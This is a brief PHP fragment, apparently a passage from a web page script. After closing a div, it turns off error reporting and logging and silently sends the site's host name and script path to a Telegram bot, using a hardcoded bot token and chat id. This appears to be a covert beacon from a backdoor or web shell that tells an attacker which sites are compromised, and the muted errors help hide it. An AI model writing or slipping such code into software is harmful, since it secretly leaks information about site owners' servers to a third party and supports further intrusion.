echo '</div>';
error_reporting(0);
error_log(0);

file_get_contents("https://api.telegram.org/bot5108963799:AAFg_DkblHFVByuLfdDX_V5r0A3UkE7Pa7s/sendMessage?chat_id=-611906272&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
